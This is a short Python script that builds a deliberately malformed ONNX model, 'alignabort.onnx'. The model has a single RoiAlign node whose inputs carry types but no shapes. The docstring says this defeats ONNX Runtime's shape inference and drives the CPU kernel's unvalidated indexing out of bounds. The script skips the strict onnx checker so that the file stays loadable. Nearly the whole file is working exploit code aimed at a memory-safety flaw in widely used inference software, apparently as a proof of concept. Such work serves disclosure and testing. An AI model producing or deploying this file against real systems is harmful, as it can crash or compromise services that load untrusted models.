#!/usr/bin/env python3
"""Build the malicious AlignAbort ONNX model.

A single RoiAlign (opset 16, standard onnx domain) whose graph inputs declare
element types but NO shapes. Without declared shapes, ONNX Runtime's shape
inference cannot reject rank-mismatched runtime tensors, and the CPU kernel's
unvalidated TensorShape indexing runs out of bounds.
"""
import os

import numpy as np
import onnx
from onnx import TensorProto, helper

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "alignabort.onnx")


def build(path):
    node = helper.make_node(
        "RoiAlign",
        ["X", "rois", "batch_indices"],
        ["Y"],
        output_height=3,
        output_width=3,
        sampling_ratio=1,
        spatial_scale=1.0,
        coordinate_transformation_mode="half_pixel",
    )
    graph = helper.make_graph(
        [node],
        "alignabort",
        # NOTE: shape=None -> ValueInfo carries type only, no shape.
        [
            helper.make_tensor_value_info("X", TensorProto.FLOAT, None),
            helper.make_tensor_value_info("rois", TensorProto.FLOAT, None),
            helper.make_tensor_value_info("batch_indices", TensorProto.INT64, None),
        ],
        [helper.make_tensor_value_info("Y", TensorProto.FLOAT, None)],
    )
    model = helper.make_model(
        graph,
        opset_imports=[helper.make_opsetid("", 16)],
        ir_version=8,  # wheels support up to IR 13; 8 is broadly accepted
    )
    # NOTE: onnx.checker rejects a ValueInfo whose `shape` field is entirely
    # missing, but ONNX Runtime loads such models without complaint — which is
    # precisely what makes this reachable. Skip the strict checker.
    onnx.save(model, path)
    print(f"[+] wrote {path}")


if __name__ == "__main__":
    build(OUT)
